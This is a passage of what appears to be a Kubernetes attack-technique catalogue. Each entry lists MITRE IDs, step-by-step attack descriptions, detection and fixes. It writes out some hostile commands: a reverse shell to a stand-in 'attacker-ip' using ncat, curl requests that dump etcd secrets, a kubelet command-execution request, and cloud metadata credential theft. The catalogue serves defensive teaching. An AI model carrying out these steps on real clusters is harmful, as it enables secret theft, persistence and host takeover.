- **Attack Steps**: 1. Attacker gains access to the cluster and locates a high-privileged pod (e.g., one running in production or handling secrets).2. They modify the pod definition to include a second container (sidecar) that listens on an internal port or relays traffic via reverse shell.3. Sidecar runs silently alongside the primary app, avoiding detection since it's part of the same pod.4. Attacker uses it to sniff traffic, intercept API tokens, or run remote commands.5. Often missed by teams focusing only on primary containers during audits.6. Lateral movement or privilege escalation can follow.
- **Detection**: Monitor for pod spec mutations, image drift
- **Solution**: Enforce immutability and image validation
- **Tags**: #sidecar #podbackdoor #k8smanipulation

## Cloning Secrets via Pod Recreation

- **Attack Type**: Secret Abuse
- **Target**: Cluster-wide
- **Vulnerability**: Weak secret distribution & pod controls
- **MITRE**: T1552.004
- **Impact**: Credential theft, further lateral movement
- **Tools**: kubectl, kubectl cp
- **Scenario**: Read Kubernetes secrets by recreating a pod with mounted secrets
- **Attack Steps**: 1. Attacker identifies a deployment mounting a Kubernetes secret (e.g., database credentials).2. They delete the pod and quickly recreate it under their control (using the same deployment or by modifying the pod spec).3. Because secrets are mounted as volumes by default, the new pod also receives the same secret.4. Attacker copies secret data (e.g., /etc/secrets/db.yaml) from within the container.5. Blue Team might not notice as the pod technically "belongs" to an existing workload.6. The attacker exfiltrates credentials to gain broader access.
- **Detection**: Kubernetes audit logs, pod creation events
- **Solution**: Use secret access controls and CSI drivers
- **Tags**: #k8ssecrets #podcloning #accesscontrol

## DaemonSet Deployment for Global Persistence

- **Attack Type**: Cluster-wide Persistence
- **Target**: Kubernetes Nodes
- **Vulnerability**: Poor DaemonSet creation monitoring
- **MITRE**: T1547.010
- **Impact**: Cluster-wide persistence
- **Tools**: kubectl, bash, custom DaemonSet YAML
- **Scenario**: Deploy malicious DaemonSet that installs malware on every node
- **Attack Steps**: 1. Attacker who has access to the API deploys a DaemonSet with a malicious container image.2. DaemonSet ensures that one copy of the backdoor is installed on every node in the cluster.3. Each malicious container starts a listener or reverse shell.4. Even if one container is detected and deleted, others persist across nodes.5. Blue Team might not audit DaemonSets regularly or have alerts on their creation.6. Result: full-cluster compromise and resilience.
- **Detection**: DaemonSet YAML analysis, API event logging
- **Solution**: Monitor DaemonSet changes, RBAC restrictions
- **Tags**: #daemonset #k8spersistence #nodecontrol

## Exploiting Ephemeral Containers for Forensics Evasion

- **Attack Type**: Runtime Evasion
- **Target**: Running Pods
- **Vulnerability**: Unmonitored ephemeral container usage
- **MITRE**: T1609
- **Impact**: Stealthy runtime exploitation
- **Tools**: kubectl debug, bash, reverse shell
- **Scenario**: Use ephemeral containers to run code without leaving pod image trace
- **Attack Steps**: 1. Attacker invokes kubectl debug to attach an ephemeral container to a running pod.2. This temporary container doesn't exist in the deployment spec, so static analysis won’t catch it.3. Inside the ephemeral container, they mount host directories, extract tokens, or run commands.4. Once completed, the container self-deletes or is garbage collected.5. Traditional forensic methods (e.g., image scanning) don’t detect the changes.6. Blue Team is unaware unless deep API event tracking or ephemeral audit logs are enabled.
- **Detection**: Kubernetes audit events, ephemeral usage alerts
- **Solution**: Disable ephemeral container APIs in prod
- **Tags**: #ephemeral #forensicsevasion #k8sruntime

## Container Escape via Capabilities Abuse (cap_sys_admin)

- **Attack Type**: Linux Capability Exploitation
- **Target**: Host Kernel
- **Vulnerability**: Dangerous capabilities not dropped
- **MITRE**: T1548.001
- **Impact**: Privilege escalation to host
- **Tools**: Docker, bash, /proc, Capsh
- **Scenario**: Abuse dangerous capabilities to perform host-level actions
- **Attack Steps**: 1. Attacker finds a container running with cap_sys_admin, which provides nearly root-level power.2. They use this to mount host filesystems (mount -t proc proc /host) or manipulate namespaces.3. May inject files into host /etc/, view /proc/kcore, or access Docker socket.4. Since cap_sys_admin is not technically full root, it may be allowed by default.5. Results in partial or full host compromise.6. Blue Team may overlook capabilities if not explicitly restricted by PodSecurityPolicy.
- **Detection**: Syscall monitoring, Falco
- **Solution**: Drop all capabilities except minimum needed
- **Tags**: #capsysadmin #capabilitiesabuse #k8sescape

## Privilege Escalation via HostIPC and Shared Memory

- **Attack Type**: Shared Namespace Exploitation
- **Target**: K8s Worker Node
- **Vulnerability**: hostIPC usage without restriction
- **MITRE**: T1611
- **Impact**: Host-level memory snooping
- **Tools**: kubectl, IPC analysis tools
- **Scenario**: Gain host-level insight via shared IPC (Inter-Process Communication)
- **Attack Steps**: 1. Attacker creates a pod with hostIPC: true, granting it access to host-level shared memory.2. They scan for IPC segments, shared memory identifiers, and message queues used by host services.3. Read sensitive data like environment variables, tokens, or inter-process instructions.4. May lead to service injection or data exfiltration from co-hosted applications.5. Blue Team rarely monitors IPC namespace abuse.6. Often paired with hostPID for more complete control.
- **Detection**: IPC event tracing, PSP enforcement
- **Solution**: Deny hostIPC in policies
- **Tags**: #hostipc #sharedmemory #k8sprivilege

## Exploiting Unsecured kubelet API for File Access

- **Attack Type**: API Abuse
- **Target**: Kubelet API
- **Vulnerability**: Unauthenticated kubelet read API
- **MITRE**: T1526
- **Impact**: Passive access to running workloads
- **Tools**: curl, port scan, kubelet API
- **Scenario**: Access pod/container files via open Kubelet read-only API
- **Attack Steps**: 1. Attacker discovers an open port 10255 on kubelet (default read-only port).2. They send HTTP requests to endpoints like /pods or /stats to enumerate active workloads.3. Using /run, /logs, or /exec endpoints, attacker reads container logs or memory.4. No authentication is required on this port.5. This access can be leveraged to steal credentials, manipulate workloads, or monitor traffic.6. Blue Team may not audit kubelet exposure unless active scanning is performed.
- **Detection**: Nmap, netstat, HTTP logs
- **Solution**: Disable insecure ports, require TLS/auth
- **Tags**: #kubeletapi #port10255 #unauthorizedaccess

## In-Cluster Token Hijack for Cloud Privilege Escalation

- **Attack Type**: Cloud Privilege Pivot
- **Target**: Cloud + K8s
- **Vulnerability**: Weak token isolation, auto-mount enabled
- **MITRE**: T1557
- **Impact**: Full cloud takeover via in-cluster pivot
- **Tools**: kube2iam, AWS CLI, gcloud
- **Scenario**: Steal IAM-bound service account tokens to escalate in cloud
- **Attack Steps**: 1. Pod has a service account token mounted automatically.2. Attacker reads token from /var/run/secrets/... path.3. Uses it to assume cloud roles (e.g., via sts:AssumeRole on AWS or gcloud auth activate-service-account).4. Escalates to manage cloud resources outside K8s.5. Exploit is especially dangerous when using kube2iam or workload identity.6. Cloud detection is missed if K8s logs aren’t integrated.
- **Detection**: Cloud logs (if centralized), auditd
- **Solution**: Disable auto-mount, use scoped tokens
- **Tags**: #serviceaccountabuse #k8scloudpivot

## Overriding InitContainer for Root Shell Access

- **Attack Type**: Container Boot-Time Abuse
- **Target**: Workloads with initContainers
- **Vulnerability**: Lack of initContainer monitoring
- **MITRE**: T1609
- **Impact**: Pre-launch container manipulation
- **Tools**: kubectl, YAML, bash
- **Scenario**: Replace initContainer logic to run root commands before main app starts
- **Attack Steps**: 1. Attacker modifies deployment to inject an initContainer with a root payload (e.g., chmod 777 /etc/shadow).2. InitContainers run before app containers and can change filesystem state.3. After running, the malicious changes persist for app container use.4. Blue Team may only review the main container logic and miss initContainer abuses.5. This method enables stealthy setup for persistent footholds.6. Works well in shared PVC environments.
- **Detection**: Pod lifecycle logging
- **Solution**: Validate initContainer behavior
- **Tags**: #initcontainer #bootabuse #k8sruntime

## Node Compromise via Malicious Pod Static Manifest

- **Attack Type**: Local File Injection
- **Target**: Node File System
- **Vulnerability**: Writable static pod manifest path
- **MITRE**: T1059.004
- **Impact**: Host compromise bypassing API
- **Tools**: Physical Access, USB, Bash
- **Scenario**: Drop malicious pod YAML in /etc/kubernetes/manifests/ to auto-run with kubelet
- **Attack Steps**: 1. Attacker with access to node file system places a malicious static pod YAML in the manifests directory.2. Kubelet watches this directory and automatically spins up the pod as root.3. The pod can mount the host, access Docker socket, or run monitoring tools.4. Since static pods are not managed by API server, they evade RBAC and API auditing.5. Full control of the node is achieved with just file write access.6. Difficult to detect without host integrity monitoring.
- **Detection**: FIM, kubelet process watcher
- **Solution**: Lock down node filesystems
- **Tags**: #staticpod #nodeabuse #manifestattack

## Exploiting Misconfigured NetworkPolicies to Pivot Across Namespaces

- **Attack Type**: Network Policy Bypass
- **Target**: Kubernetes Namespaces
- **Vulnerability**: Absence of NetworkPolicy enforcement
- **MITRE**: T1021.002
- **Impact**: Cross-namespace data theft and lateral movement
- **Tools**: kubectl, nmap, socat
- **Scenario**: Lateral movement across isolated services due to default-allow ingress policies
- **Attack Steps**: 1. Attacker compromises a pod in the dev namespace through a vulnerable web app.2. They notice that the cluster does not enforce restrictive NetworkPolicies (default Kubernetes behavior is to allow all ingress/egress unless specified).3. Using nmap and netcat, attacker scans for open services running in the prod namespace (e.g., Redis, MongoDB).4. They initiate a connection to internal services (like databases) and attempt authentication with weak or default credentials.5. Once inside prod, they retrieve sensitive production data.6. This lateral movement goes unnoticed if traffic flow between namespaces is not audited.7. They can now escalate further by accessing cloud keys or app secrets in these services.
- **Detection**: Network flow logs, Calico flow logs (if available)
- **Solution**: Apply deny-all by default NetworkPolicies per namespace
- **Tags**: #networkpolicy #k8slateral #namespacepivot

## Accessing Internal Cloud Metadata via Misconfigured Pods

- **Attack Type**: Cloud Metadata Abuse
- **Target**: Cloud-Hosted Clusters
- **Vulnerability**: Unrestricted pod egress to metadata endpoints
- **MITRE**: T1557
- **Impact**: Cloud account compromise from inside cluster
- **Tools**: curl, AWS CLI, GCP Metadata API
- **Scenario**: Exploiting pod egress to query cloud provider metadata endpoints and gain credentials
- **Attack Steps**: 1. Attacker compromises a container in a cloud-hosted Kubernetes cluster (e.g., EKS, GKE).2. They test access to the cloud metadata endpoint, such as http://169.254.169.254/latest/meta-data/ (AWS) or /computeMetadata/v1/ (GCP).3. If there are no egress firewall restrictions, attacker receives IAM role credentials from metadata.4. They copy AccessKeyId, SecretAccessKey, and Token from the metadata response.5. With aws configure, they assume the IAM role and check for attached permissions (e.g., S3, EC2, Lambda).6. They now pivot into the cloud environment with elevated privileges, bypassing cluster RBAC.7. The attack may go unnoticed if cloud logs and K8s logs aren't integrated.
- **Detection**: CloudTrail, VPC Flow Logs, K8s pod DNS logs
- **Solution**: Use IMDSv2, block pod egress to 169.254.x.x
- **Tags**: #cloudpivot #metadataabuse #imds

## Overprovisioned ServiceAccounts with cluster-admin Role

- **Attack Type**: RBAC Escalation
- **Target**: Cluster-wide
- **Vulnerability**: Misconfigured RBAC bindings
- **MITRE**: T1078
- **Impact**: Total cluster takeover
- **Tools**: kubectl, kube-hunter
- **Scenario**: Service accounts used by pods are granted overly broad permissions
- **Attack Steps**: 1. Attacker identifies a running pod (e.g., Jenkins, ArgoCD, custom CI) and gains shell access.2. Inside the container, they access the service account token mounted at /var/run/secrets/kubernetes.io/serviceaccount/token.3. They base64 decode the token and use kubectl --token to interact with the K8s API.4. They run kubectl auth can-i --list and discover they have cluster-admin permissions.5. They can now create, modify, or delete any resource across the cluster, deploy malicious workloads, or exfiltrate secrets.6. Overprivileged service accounts are a common misconfiguration, especially in CI/CD pipelines.7. Blue Team may not notice unless API call frequency is monitored for anomalies.
- **Detection**: K8s audit logs, RBAC permission review
- **Solution**: Use least-privilege roles and namespace-scoped SA
- **Tags**: #rbac #clusteradmin #k8stokenabuse

## Poisoning ImagePullSecrets to Pull Malicious Container

- **Attack Type**: Registry Poisoning
- **Target**: Image Registries
- **Vulnerability**: Weak control of pull secrets
- **MITRE**: T1555.003
- **Impact**: Remote code execution from tainted image
- **Tools**: DockerHub, kubectl, Yaml Editor
- **Scenario**: Override registry credentials to fetch attacker-controlled image
- **Attack Steps**: 1. Attacker has access to deployment YAML or Helm chart with imagePullSecrets configured.2. They modify the secret to point to a malicious registry or override credentials to pull their own image from DockerHub.3. The malicious image includes tools like nmap, reverse shells, or keyloggers.4. Upon deployment, Kubernetes pulls the attacker's container, thinking it’s a valid application image.5. The malicious container runs with expected permissions, bypassing static scanning.6. If no runtime monitoring is present, Blue Team remains blind.7. Lateral movement or crypto mining may follow.
- **Detection**: Image hash mismatch, registry access logs
- **Solution**: Use signed images and private registries
- **Tags**: #imagepull #containerpoisoning #supplychain

## Misusing Pod Exec for Live Database Dump

- **Attack Type**: Pod Exec Abuse
- **Target**: Stateful Apps / DB Pods
- **Vulnerability**: Overuse of kubectl exec and CP
- **MITRE**: T1059.004
- **Impact**: Sensitive data theft
- **Tools**: kubectl, psql, mongosh, mysql
- **Scenario**: Interactive access to DB pods for data exfiltration using kubectl exec
- **Attack Steps**: 1. Attacker gains access to credentials or token allowing them to run kubectl exec into a live pod.2. They find a pod running PostgreSQL or MongoDB and connect interactively (kubectl exec -it db-pod -- psql).3. Without additional controls, attacker dumps database tables to local files.4. Files are exfiltrated using kubectl cp or through reverse shell setups.5. Attack leaves minimal audit trails unless kubectl exec logs are reviewed.6. In high-availability DB setups, the data theft may go unnoticed.7. This tactic is especially risky when exec permissions are granted to developers or CI users.
- **Detection**: API Server audit logs (if enabled)
- **Solution**: Restrict exec access using RBAC + OPA Gatekeeper
- **Tags**: #kubectlexec #datadump #liveaccess

## Deploying a Malicious CronJob for Persistent Access

- **Attack Type**: Scheduled Job Abuse
- **Target**: All Workloads
- **Vulnerability**: Inadequate job control policies
- **MITRE**: T1053.005
- **Impact**: Persistence via scheduled actions
- **Tools**: kubectl, cronjob YAML
- **Scenario**: Attackers use CronJobs to run malicious tasks periodically for recon or beaconing
- **Attack Steps**: 1. Attacker deploys a new CronJob in a namespace they can access.2. The CronJob runs a script every 5 minutes to call back to a C2 server or scan internal resources.3. Since CronJobs run briefly and clean up after execution, detection is difficult.4. If resource usage or DNS resolution isn’t logged, beaconing can go unnoticed.5. Some CronJobs may be used to inject files, rotate shells, or re-establish access after Blue Team wipes other artifacts.6. Attacker uses random names or disguises the job under a legitimate app name.7. This results in recurring, stealthy presence inside the cluster.
- **Detection**: CronJob audit logs, DNS query logs
- **Solution**: Enforce whitelisted CronJob images only
- **Tags**: #cronjob #k8spersistence #scheduledbackdoor

## Hijacking Helm Charts to Deploy Trojanized Workload

- **Attack Type**: CI/CD Supply Chain Abuse
- **Target**: Helm-Deployed Apps
- **Vulnerability**: GitOps pipeline compromise
- **MITRE**: T1608.006
- **Impact**: CI/CD-driven RCE in Kubernetes
- **Tools**: Helm, GitHub, HelmHub
- **Scenario**: Modify Helm chart in Git repo to auto-deploy compromised containers
- **Attack Steps**: 1. Attacker gains access to a GitHub repository used for Helm-based deployment.2. They edit the values.yaml file or template logic to include a malicious container alongside a legitimate workload.3. On next CI/CD pipeline run, this Helm chart is used to deploy a service with the attacker's payload.4. If values are templated from secrets or config maps, attacker may also exfil sensitive data.5. Since the container image is defined in trusted IaC, it's often not deeply reviewed.6. Compromised workload now runs with full application context.7. Exploit can persist until someone audits the chart.
- **Detection**: Git audit logs, Helm diff plugins
- **Solution**: Use signed charts, repo protection rules
- **Tags**: #helmabuse #supplychainattack #gitops

## Exploiting Insecure Admission Controllers

- **Attack Type**: Control Plane Abuse
- **Target**: Control Plane
- **Vulnerability**: Missing or weak admission control
- **MITRE**: T1484.002
- **Impact**: Guardrail bypass, RCE
- **Tools**: OPA Gatekeeper, Kyverno
- **Scenario**: Bypass admission policies to inject risky workloads
- **Attack Steps**: 1. Attacker inspects cluster and finds that no ValidatingAdmissionWebhook is in place.2. They deploy a privileged pod or one with hostPath, which would normally be blocked.3. Since admission controllers are absent or misconfigured, deployment proceeds.4. Pod runs with full host access or escalated capabilities.5. No enforcement, no audit trail for the rejected policy.6. Blue Team cannot detect without external policy engines like Kyverno or OPA logging.7. Result: full bypass of security guardrails.
- **Detection**: Admission webhook logs (if used)
- **Solution**: Implement validating/mutating admission policies
- **Tags**: #opa #admissionbypass #kyverno

## Access to Kubeconfig via Compromised Dev Machine

- **Attack Type**: Developer Endpoint Exploitation
- **Target**: Developer Machines
- **Vulnerability**: Lack of kubeconfig protection
- **MITRE**: T1557
- **Impact**: Cluster compromise via developer endpoint
- **Tools**: SSH, scp, kubeconfig
- **Scenario**: Leverage stolen kubeconfig file to access cluster externally
- **Attack Steps**: 1. Attacker compromises a developer’s laptop (via phishing, malware, or exposed RDP).2. They locate the ~/.kube/config file which contains cluster info and auth tokens or client certs.3. Using that config, attacker connects from their own system to the K8s cluster using kubectl.4. Depending on the permissions, they gain access to deploy pods, read secrets, or tamper with workloads.5. Blue Team may not detect this if there’s no IP allowlist or device fingerprinting.6. Attack escalates from local compromise to infrastructure compromise.7. If MFA or token expiration is not enforced, access persists.
- **Detection**: kubectl logs, IP logs
- **Solution**: Encrypt & rotate kubeconfig, use OIDC w/ MFA
- **Tags**: #devendpoint #kubeconfigleak #tokenreuse

## DNS Rebinding Attack via In-Cluster Service Exploitation

- **Attack Type**: Network Exploit
- **Target**: Internal Services
- **Vulnerability**: Application making DNS calls to user-controlled domains
- **MITRE**: T1557.001
- **Impact**: Internal traffic redirection and session hijack
- **Tools**: Burp, Rebind Toolkit
- **Scenario**: Rebind internal service IP to attacker's domain and inject traffic
- **Attack Steps**: 1. Attacker tricks a pod’s application into making DNS queries to a malicious domain.2. They set up a DNS server to reply first with attacker-controlled IP, then rebind to internal K8s IPs (e.g., kubernetes.default.svc).3. App trusts DNS results and starts making calls to API server or other services.4. Attacker intercepts JWTs, service credentials, or session headers.5. Rebinding bypasses origin checks due to DNS-level tricks.6. This works especially well in browser-based dashboards running inside pods.7. Blue Team rarely monitors DNS behavior inside app logic.
- **Detection**: DNS logs, Rebind detection scripts
- **Solution**: Harden DNS resolution, restrict external calls
- **Tags**: #dnsrebind #internaltraffic #svcspoofing

## Exploiting Wildcard HostPath Mounts for Host Access

- **Attack Type**: HostPath Exploitation
- **Target**: K8s Nodes
- **Vulnerability**: Broad hostPath permissions
- **MITRE**: T1611
- **Impact**: Full host compromise from inside pod
- **Tools**: kubectl, bash
- **Scenario**: Using overly permissive hostPath: / mounts to gain full control of host filesystem
- **Attack Steps**: 1. Attacker gains access to a pod with hostPath mount defined as /, allowing access to the entire host filesystem.2. They check the mounted directory inside the container (e.g., /mnt/host) and verify access to /etc, /var/log, /root, etc.3. By navigating to /mnt/host/etc/shadow, attacker copies sensitive files from host.4. They can also drop a new SSH key into /mnt/host/root/.ssh/authorized_keys, granting persistent host access.5. From here, full host compromise is possible — attacker can modify binaries or inject malware.6. This is essentially a container escape without exploiting the runtime, purely based on misconfiguration.7. No container runtime alerts are triggered, making it stealthy.
- **Detection**: Host integrity monitoring, File integrity checks
- **Solution**: Never use wildcards or / in hostPath; use read-only & restrict scope
- **Tags**: #hostpath #containerescape #k8smisconfig

## Escalating via Misconfigured PodSecurityPolicies (PSPs)

- **Attack Type**: PSP Bypass
- **Target**: Control Plane
- **Vulnerability**: Overly permissive PSP configuration
- **MITRE**: T1609
- **Impact**: Container with dangerous permissions or host access
- **Tools**: kubectl, PSP API
- **Scenario**: Exploiting permissive PodSecurityPolicy to deploy privileged or dangerous pods
- **Attack Steps**: 1. Attacker targets a cluster using legacy PodSecurityPolicies with loose restrictions.2. They deploy a pod with privileged: true and host networking enabled, which should normally be blocked.3. The PSP does not restrict hostNetwork, hostPID, hostIPC, or Linux capabilities like NET_ADMIN, allowing attackers to sniff traffic and manipulate network stack.4. Once deployed, attacker uses tcpdump to capture traffic or sets up a proxy to MITM internal services.5. If audit logging is not enabled, these escalations happen silently.6. Many older clusters still rely on PSPs instead of newer PodSecurity standards or OPA/Gatekeeper policies.7. Impact includes host-level access and network tampering.
- **Detection**: PSP audit logs, container runtime logs
- **Solution**: Migrate to PodSecurity standards and restrict pod permissions
- **Tags**: #psp #k8sescalation #privilegedpods

## Compromising Kubernetes Through Unrestricted Ingress Controllers

- **Attack Type**: Ingress Exploitation
- **Target**: Ingress Controller
- **Vulnerability**: Wildcard domain routing & trust headers
- **MITRE**: T1190
- **Impact**: External exposure of internal apps
- **Tools**: Nginx Ingress, Burp Suite
- **Scenario**: Injecting malicious traffic via misconfigured ingress rules or wildcards
- **Attack Steps**: 1. Attacker scans public-facing ingress URLs and discovers wildcards like *.example.com pointing to internal services.2. They register malicious.example.com and direct it to their own payload server.3. Due to wildcard ingress and open backend routing, their subdomain now routes to internal cluster services.4. They use crafted payloads (e.g., SSRF, LFI) against internal apps running behind ingress.5. If backend services trust X-Forwarded-For, attacker can spoof IPs.6. Blue Team lacks visibility unless ingress logs and DNS logs are correlated.7. This misconfiguration enables SSRF, phishing, and internal access via external endpoints.
- **Detection**: Ingress controller logs, DNS records
- **Solution**: Use allowlists, validate headers, and disable wildcards
- **Tags**: #ingressmisconfig #ssrf #wildcarddanger

## Sidecar Injection for Traffic Sniffing

- **Attack Type**: Internal Traffic Interception
- **Target**: Application Pods
- **Vulnerability**: Lack of deployment validation & monitoring
- **MITRE**: T1040
- **Impact**: Real-time credential harvesting & recon
- **Tools**: Istio, tcpdump, netstat
- **Scenario**: Deploying a rogue sidecar to sniff traffic between containers
- **Attack Steps**: 1. Attacker compromises a deployment YAML and adds a new sidecar container to an existing pod.2. This sidecar uses tcpdump, tshark, or mitmproxy to capture traffic from the primary container.3. The service continues to function as normal, but the sidecar silently logs requests and responses.4. If the app handles secrets or tokens, attacker captures them in real time.5. Blue Team might miss this if changes to deployment specs are not tracked.6. Sidecars often inherit full network access within the pod.7. The attacker exfiltrates logs out of the cluster or downloads them on demand.
- **Detection**: Container diff tools, API server audit logs
- **Solution**: Enforce deployment immutability, monitor new sidecar additions
- **Tags**: #sidecarattack #trafficcapture #k8sinsider

## Exploiting CVE-2018-1002105: Kube API Server Proxy Bypass

- **Attack Type**: CVE Exploitation
- **Target**: Kubernetes API Server
- **Vulnerability**: CVE-2018-1002105
- **MITRE**: T1210
- **Impact**: Bypass auth → full pod access
- **Tools**: curl, Burp, K8s Proxy API
- **Scenario**: Exploit a historical flaw in API Server handling of upgrade requests
- **Attack Steps**: 1. Attacker targets a cluster running a vulnerable version of Kubernetes (<1.10).2. They craft a malicious HTTP request using the Upgrade: SPDY/3.1 header to API endpoints like /api/v1/namespaces/kube-system/pods/…/proxy.3. This bypasses RBAC and allows attacker to send arbitrary commands through the API server to internal pods.4. Attacker runs commands inside kube-system pods or sensitive services like etcd or coredns.5. This is a known unauthenticated remote code execution path.6. Legacy clusters are particularly at risk if not patched.7. Full cluster compromise is possible if access is gained to kube-dns or etcd.
- **Detection**: API Server logs, WAF logs
- **Solution**: Ensure all nodes run patched versions (≥1.10.11+)
- **Tags**: #cve2018 #apispoofing #proxybypass

## Overriding Container Entrypoint to Load Reverse Shell

- **Attack Type**: Runtime Override
- **Target**: CI/CD Deployed Apps
- **Vulnerability**: Lack of validation on pod spec overrides
- **MITRE**: T1059.004
- **Impact**: Covert reverse shell in legit container
- **Tools**: kubectl, ncat
- **Scenario**: Redefine command or args in pod spec to spawn attacker shell
- **Attack Steps**: 1. Attacker has access to modify a deployment YAML in CI/CD pipeline or GitOps repo.2. Instead of using the intended entrypoint or command, they override it to run /bin/bash -c 'ncat attacker-ip 4444 -e /bin/bash'.3. When the pod starts, it immediately establishes a reverse shell to the attacker's listener.4. The container appears as “healthy” since K8s only checks container state, not activity.5. Reverse shell provides unrestricted access to container internals.6. If the pod has mounted secrets or cloud SDKs, attacker can pivot.7. This is particularly dangerous in GitOps flows without peer-review on changes.
- **Detection**: Kube API logs, Runtime alerts
- **Solution**: Enforce image integrity & signed specs
- **Tags**: #entrypointabuse #gitops #reverseshell

## Persistence via MutatingAdmissionWebhook

- **Attack Type**: Cluster-Level Backdoor
- **Target**: Cluster Admission Controller
- **Vulnerability**: API server extensibility abuse
- **MITRE**: T1205.003
- **Impact**: Long-term persistence via K8s admission
- **Tools**: kubectl, webhook server
- **Scenario**: Attackers create or modify a Mutating Webhook to alter all new deployments
- **Attack Steps**: 1. Attacker creates a MutatingAdmissionWebhook that automatically injects a malicious init container into all new pods.2. This webhook is registered to trigger on all CREATE requests for pods.3. When a new pod is deployed, the webhook inserts a container that exfiltrates data or maintains C2 beaconing.4. Because this is enforced by the API server, even trusted pipelines unknowingly deploy tainted pods.5. Webhook server runs on attacker-controlled node or externally.6. Unless cluster admins monitor webhook changes, this remains persistent.7. Impact includes persistent backdoor at control plane level.
- **Detection**: AdmissionRegistration logs, webhook certs
- **Solution**: Monitor all admission configs, use signed webhooks
- **Tags**: #mutatingwebhook #persistence #k8sadmission

## Host Process Access via DaemonSet Exploit

- **Attack Type**: DaemonSet Abuse
- **Target**: K8s Nodes
- **Vulnerability**: DaemonSet used as lateral backdoor
- **MITRE**: T1070.006
- **Impact**: Uniform host access across cluster
- **Tools**: kubectl, YAML editor
- **Scenario**: Deploy a DaemonSet to run privileged containers on all nodes
- **Attack Steps**: 1. Attacker with cluster-admin access deploys a DaemonSet with privileged access and host mounts.2. Each node runs one replica of the container, giving attacker uniform access to all hosts.3. Inside container, attacker can write to /etc/shadow, drop SSH keys, or run host-level commands.4. This is used for persistence or mass deployment of rootkits.5. Detection is difficult without node-level logging.6. Security tools inside containers may not catch this since access is at host level.7. Useful in ransomware or cryptojacking at scale.
- **Detection**: Node logs, anomaly detection in runtime tools
- **Solution**: Restrict DaemonSet creation to admins only
- **Tags**: #daemonset #hostaccess #clusterbackdoor

## Exploiting Open ETCD for Secret Harvesting

- **Attack Type**: Secret Theft
- **Target**: ETCD Service
- **Vulnerability**: Lack of access control and TLS on etcd
- **MITRE**: T1552.004
- **Impact**: Complete secret dump from K8s backend
- **Tools**: etcdctl, curl
- **Scenario**: Direct access to ETCD exposes all Kubernetes secrets
- **Attack Steps**: 1. Attacker finds that etcd service is publicly accessible on 2379 without TLS or auth.2. Using curl or etcdctl, they list keys from etcd (/registry/secrets, /registry/pods, etc).3. All Kubernetes secrets (service tokens, database passwords, TLS keys) are base64 encoded but not encrypted.4. Attacker decodes secrets locally and accesses high-value credentials.5. If etcd backs other clusters, this can lead to widespread compromise.6. Exploiting ETCD is silent unless network traffic or config files are monitored.7. Attacker now has root-level access to K8s resources without touching pods.
- **Detection**: etcd access logs, port scans
- **Solution**: Lock etcd with TLS, firewall rules & authentication
- **Tags**: #etcdexposed #secrettheft #k8sbackend

## Phishing Devs to Steal Kubectl Configs

- **Attack Type**: Credential Phishing
- **Target**: Developer Endpoint
- **Vulnerability**: Human error + lack of endpoint control
- **MITRE**: T1566.001
- **Impact**: Full external access to internal K8s cluster
- **Tools**: Evilginx, Gophish
- **Scenario**: Craft phishing email with malicious link to exfil ~/.kube/config
- **Attack Steps**: 1. Attacker crafts a phishing email that mimics internal DevSecOps portal.2. Victim developer clicks the link and downloads a “kubectl helper” binary, which silently copies ~/.kube/config.3. Attacker’s server receives exfiltrated config, which includes cluster info and access token.4. With kubectl, attacker connects to cluster from their system.5. If token is long-lived or cluster uses static secrets, attacker maintains persistent access.6. Attack blends into routine behavior and bypasses MFA if OIDC isn’t enforced.7. Devs rarely audit their local kubeconfig permissions.
- **Detection**: Kube API logs, DNS logs, phishing alerting
- **Solution**: Enforce MFA, monitor kubeconfig access & usage
- **Tags**: #kubephishing #endpointsecurity #socialengineering

## Exploiting Unauthenticated Kubelet API for Pod Execution

- **Attack Type**: Kubelet API Exposure
- **Target**: Worker Nodes
- **Vulnerability**: Kubelet unauthenticated endpoint
- **MITRE**: T1059.004
- **Impact**: Unrestricted pod access
- **Tools**: curl, kubelet-exploit scripts
- **Scenario**: Abuse of open Kubelet API on port 10250 to run commands in containers
- **Attack Steps**: 1. Attacker scans cluster subnet and discovers port 10250 (Kubelet API) open on multiple nodes.2. They send a crafted HTTP request: GET https://<node-ip>:10250/run/<pod>/<namespace>/<container>.3. Since authentication is disabled, kubelet executes the provided command inside the container.4. Attacker runs wget or reverse shell to establish persistent access.5. No RBAC is enforced; the kubelet trusts all unauthenticated traffic.6. They dump logs using /logs endpoint and discover secrets in plain text.7. Full access to any pod running on that node without credentials.
- **Detection**: Network scans, port 10250 access logs
- **Solution**: Secure kubelet with TLS auth & firewall
- **Tags**: #kubelet #k8sunauth #apiexposure

## Abusing ClusterRoleBinding for Full Cluster Takeover

- **Attack Type**: RBAC Misuse
- **Target**: K8s Cluster
- **Vulnerability**: ClusterRoleBinding to privileged roles
- **MITRE**: T1068
- **Impact**: Full cluster compromise
- **Tools**: kubectl, K8s API
- **Scenario**: Escalate privileges via overly broad ClusterRoleBindings assigned to service accounts
- **Attack Steps**: 1. Attacker finds a pod with mounted service account token.2. They access the token at /var/run/secrets/kubernetes.io/serviceaccount/token and use it with kubectl.3. The token has cluster-admin privileges due to a misconfigured ClusterRoleBinding.4. Attacker now has unrestricted API access across the entire cluster.5. They create new pods, delete namespaces, exfiltrate secrets, and install persistent backdoors.6. This is one of the most common real-world privilege escalation paths in K8s.7. Blue Teams often fail to audit service account permissions.
- **Detection**: Audit RoleBindings and API calls
- **Solution**: Apply least privilege to service accounts
- **Tags**: #rbacmisuse #k8sprivilegeescalation

## Reading Secrets from Open ETCD Endpoint

- **Attack Type**: ETCD Exploitation
- **Target**: ETCD Backend
- **Vulnerability**: No TLS or ACLs on ETCD
- **MITRE**: T1552.004
- **Impact**: Cluster-wide secret compromise
- **Tools**: etcdctl, curl
- **Scenario**: Direct access to ETCD over unprotected TCP socket yields base64-encoded K8s secrets
- **Attack Steps**: 1. Attacker finds ETCD port (2379) open without TLS or authentication.2. Using curl http://<ip>:2379/v2/keys/registry/secrets, they retrieve all stored secrets.3. Secrets include database passwords, TLS certs, and service account tokens.4. Attacker decodes base64 data and accesses credentials for various pods/services.5. They replay service account tokens to impersonate trusted workloads.6. Since ETCD is the source of truth, this bypasses K8s RBAC.7. Entire cluster secrets exposed without touching any pods.
- **Detection**: ETCD access logs, port monitoring
- **Solution**: Secure ETCD with auth & mTLS
- **Tags**: #etcdexploit #k8sbackend #secretdump

## Accessing Exposed K8s Dashboard with No Authentication

- **Attack Type**: UI Exposure
- **Target**: Web Dashboard
- **Vulnerability**: No auth + cluster-admin dashboard
- **MITRE**: T1069.003
- **Impact**: GUI access to full cluster
